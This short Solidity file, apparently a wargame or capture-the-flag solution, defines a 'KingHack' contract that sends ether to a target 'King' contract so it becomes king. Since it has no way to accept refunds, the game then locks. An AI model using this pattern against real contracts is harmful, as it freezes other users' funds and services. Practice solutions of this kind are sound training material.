// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

contract KingHack {
    function hack(address kingContract) external payable returns (bool) {
        (bool success, ) = kingContract.call{value: msg.value}("");
        return success;
    }
}
